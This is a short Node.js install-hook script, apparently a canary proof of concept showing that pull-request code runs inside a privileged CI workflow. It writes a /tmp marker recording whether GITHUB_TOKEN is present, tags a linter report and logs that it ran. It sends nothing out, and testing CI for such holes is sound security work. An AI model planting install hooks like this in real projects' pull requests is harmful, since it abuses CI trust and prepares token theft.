const fs = require('fs');
const path = require('path');
const base = process.env.INIT_CWD || process.cwd();
fs.writeFileSync('/tmp/ADP_PR_CANARY_MARKER', 'RCE token=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no') + ' repo=' + (process.env.GITHUB_REPOSITORY || 'none'));
const p = path.join(base, 'linter-report.txt');
let s = '';
try { s = fs.readFileSync(p, 'utf8'); } catch (e) {}
fs.writeFileSync(p, s + '\nRCE-CANARY-PRIVILEGED-WORKFLOW-RUN-CODE-EXECUTION\n');
console.log('POSTINSTALL_CANARY_EXECUTED');
